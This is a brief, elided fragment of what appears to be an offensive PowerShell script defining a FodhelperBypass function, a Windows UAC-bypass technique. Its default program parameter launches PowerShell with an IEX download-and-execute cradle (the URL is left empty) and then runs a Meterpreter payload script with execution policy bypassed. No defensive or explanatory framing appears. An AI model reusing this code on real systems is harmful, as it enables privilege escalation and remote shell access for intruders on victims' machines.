...
function FodhelperBypass(){ 
 Param (
        ...
        [String]$program = "cmd.exe /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(''); powershell.exe -ExecutionPolicy Bypass -NoExit -File meterpreter-64.ps1""" #default
       )
